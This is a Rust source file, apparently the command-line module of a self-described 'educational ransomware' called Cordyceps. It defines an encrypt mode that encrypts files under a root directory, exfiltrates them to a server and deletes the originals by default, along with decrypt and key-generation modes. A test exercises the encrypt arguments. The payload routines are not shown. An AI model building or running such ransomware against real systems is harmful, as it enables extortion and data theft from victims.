//! CLI parsing and mode dispatch logic.
//!
//! This module handles all command-line interface logic, including argument
//! parsing and delegation to encryption or decryption routines.

use crate::error::AppError;
use clap::Parser;
use log::{debug, info};
use std::path::PathBuf;

use crate::crypto::generate;
use crate::fsutils::{disinfect, sporulate};

/// Command-line arguments
#[derive(Parser, Debug)]
#[command(
    author = env!("CARGO_PKG_AUTHORS"),
    version = env!("CARGO_PKG_VERSION"),
    about = env!("CARGO_PKG_DESCRIPTION"),
    long_about = "Cordyceps is an educational ransomware designed for academic and research purposes."
)]
enum Cli {
    Encrypt(EncryptArgs),
    Decrypt(DecryptArgs),
    Generate(GenerateArgs),
}

#[derive(Parser, Debug)]
#[command(about = "Encrypts and exfiltrates files in .zombie format")]
struct EncryptArgs {
    /// Root directory
    #[arg(short = 'p', long, default_value = ".")]
    path: PathBuf,

    /// Do not delete original files after encryption--encryption mode only
    #[arg(short = 'n', long)]
    no_delete: bool,

    /// Server address for exfiltration--encryption mode only
    #[arg(short = 's', long, default_value = "http://localhost:8080")]
    server: String,

    /// Target folder on the server for exfiltration--encryption mode only
    #[arg(short = 't', long)]
    target_folder: Option<String>,
}

#[derive(Parser, Debug)]
#[command(about = "Restores encrypted .zombie files with a private key")]
struct DecryptArgs {
    /// Root directory
    #[arg(short = 'p', long, default_value = ".")]
    path: PathBuf,

    /// Path to the server private key--decryption mode only
    #[arg(short = 'k', long, default_value = "server_ed25519_private.key")]
    key: PathBuf,
}

#[derive(Parser, Debug)]
#[command(about = "Generate new master key pair")]
struct GenerateArgs {
    #[arg(short = 'p', long, default_value = "server_ed25519_private.key")]
    path: PathBuf,
}

/// Parses CLI arguments and executes the appropriate application mode
/// (encrypt or decrypt).
///
/// This function serves as the entry point for command-line interaction.
/// It determines the mode selected by the user and delegates to the
/// corresponding logic.
pub fn run() -> Result<(), AppError> {
    let args = match Cli::try_parse() {
        Ok(args) => args,
        Err(e) => e.exit(),
    };

    info!("Arguments parsed and loaded");
    debug!("Arguments: {:?}", args);

    match args {
        Cli::Encrypt(args) => sporulate(
            &args.path,
            &args.no_delete,
            &args.server,
            &args.target_folder,
        ),
        Cli::Decrypt(args) => disinfect(&args.path, &args.key),
        Cli::Generate(args) => generate(&args.path),
    }
}

#[cfg(test)]
mod tests {
    use super::*;
    use clap::Parser;

    #[test]
    fn test_encrypt_args_parsing() {
        let args = Cli::parse_from([
            "app",
            "encrypt",
            "-p",
            "/tmp",
            "-n",
            "-s",
            "http://example.com",
            "-t",
            "backup",
        ]);

        if let Cli::Encrypt(args) = args {
            assert_eq!(args.path.to_str().unwrap(), "/tmp");
            assert!(args.no_delete);
            assert_eq!(args.server, "http://example.com");
            assert_eq!(args.target_folder.unwrap(), "backup");
        } else {
            panic!("Expected encrypt args");
        }
    }
}
